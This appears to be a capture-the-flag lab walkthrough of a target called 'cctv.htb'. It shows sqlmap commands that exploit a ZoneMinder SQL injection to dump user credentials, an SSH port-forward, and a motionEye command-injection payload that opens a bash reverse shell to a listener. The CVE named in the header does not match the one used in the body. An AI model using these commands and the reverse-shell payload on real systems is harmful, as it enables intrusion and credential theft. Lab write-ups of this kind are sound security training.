![](Assets/Pasted%20image%2020260314150646.png)

**Main Vectors:** SQL Injection (CVE-2024-51482), Local Port Forwarding, Command Injection (CVE-2022-25568).

---
## 1. Reconnaissance & Enumeration

After establishing a connection to the target network via OpenVPN, we initiated the reconnaissance phase with an exhaustive `nmap` scan to identify open ports and running services.

![](Assets/Pasted%20image%2020260314151136.png)

The scan revealed two exposed ports. Upon further service and version enumeration:

![](Assets/Pasted%20image%2020260314151552.png)

We identified a web service running. To interact with it properly through virtual host routing, the target IP was append to the local `/etc/hosts` file mapping to `cctv.htb`. 

---
## 2. Vulnerability Discovery

Navigating to the web portal, we discovered a login interface.

![](Assets/Pasted%20image%2020260314152214.png)

By researching default credentials for common CCTV software, we accessed the system and identified the running application as **ZoneMinder v1.37.63**.

![ZoneMinder Version](Assets/Pasted%20image%2020260314153717.png)

### Exploting ZoneMinder (CVE-2024-51482)

Vulnerability research on this specific version revealed it is susceptible to **CVE-2024-51482**, an unauthenticated/authenticated SQL Injection within the `removetag` action via the `tid` parameter.

*Target Endpoint:* `/zmb/index.php?view=request&request=event&action=removetag&tid=`

![](Assets/Pasted%20image%2020260314155405.png)

To automate the extraction, we leveraged `sqlmap`. First, we intercepted a valid session cookie (`ZMSESSID`) and targeted the database architecture.

!!! info "SQLMap Execution - Database Enumeration"
```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=YOUR_ZMSESSID" -p tid --dbms=mysql --batch --dbs
```
* `-u "..."`: We pass the exact vulnerable URL you discovered in the report.
* `--cookie="..."`: Your VIP pass. Without this, the server would redirect us to the login panel.
* `-p tid`: Isolates the payload injection to the vulnerable parameter.
* `--dbms=mysql`: Optimizes the attack by specifying the backend engine.
* `--batch`: Automatically answers "Yes" to all questions by default so you don't have to keep pressing Enter.
* `--dbs`: Our first objective. Asks it to list the names of the available databases.

![](Assets/Pasted%20image%2020260314165515.png)

![](Assets/Pasted%20image%2020260314170534.png)

With the `zm` database identified we enumerated its tables, locating the high-value `Users` table:

```bash
sqlmap -u "[http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1](http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1)" --cookie="ZMSESSID=YOUR_ZMSESSID" -p tid --dbms=mysql --batch -D zm --tables
```

![](Assets/Pasted%20image%2020260314175046.png)

Check the columns of the table of Users.

``` bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=YOUR_ZMSESSID" -p tid --dbms=mysql --batch -D zm -T Users --columns
```

![](Assets/Pasted%20image%2020260314211149.png)

We proceeded to dump the specifc columns (`Username`, `Password`) to retrieve the credentials:

```bash
sqlmap -u "[http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1](http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1)" \  
-D zm -T Users -C Username,Password \  
--dump --batch --dbms=MySQL --technique=T \  
--cookie="ZMSESSID=YOUR_ZMSESSID"
```

![](Assets/Pasted%20image%2020260314214427.png)

After cracking the extracted hash, we obtained the plaintext password: `opensesame`.

![](Assets/Pasted%20image%2020260314220648.png)

---
## 3. Initial Access

Using the compromised credentials, we established an SSH connection as the user `mark` and successfully retrieved the `user.txt` flag.

![](Assets/Pasted%20image%2020260316133909.png)

---
## 4. Privilege Escalation

During the internal enumeration phase, we analyzed the running local services to identify potential escalation vectors.

![](Assets/Pasted%20image%2020260316185540.png)

We discovered an internal service (motionEye) running on `127.0.0.1:8765`. To interact with this internal web application from our attacking machine, we established an SSH Local Port Forwarding tunnel:

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.9.95
```

Accessing `http://localhost:8765` in our local browser granted us access to the motionEye dashboard. Inspecting the page source revealed the exact version: **motionEye 0.42.1**.

![](Assets/Pasted%20image%2020260316190345.png)

![](Assets/Pasted%20image%2020260316190418.png)

### Exploiting motionEye (CVE-2025-60787)

Research indicated this specific version suffers from an OS Command Injection vulnerability tracked as **CVE-2025-60787**.

![](Assets/Pasted%20image%2020260316190608.png)

The vulnerability resides in configuration parameters such as the **Image File Name** field. Unsanitized user input is written directly into the Motion configuration files. This allows an aunthenticated attacker to inject malicious commands that will trigger and achieve arbitrary code execution once the Motion service is restarted. We crafted a malicious payload using Python to spawn a reverse shell:

!!! danger "Weaponized Payload"
```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')")
```

![](Assets/Pasted%20image%2020260316190811.png)

After setting up a `netcat` listener (`nc -lvnp 4444`) on our attacking machine, injecting the payload into the configuration, and applying the changes (triggering a restart of the service), the system executed our command as the `root` user.

![](Assets/Pasted%20image%2020260316205014.png)

Full system compromise achieved.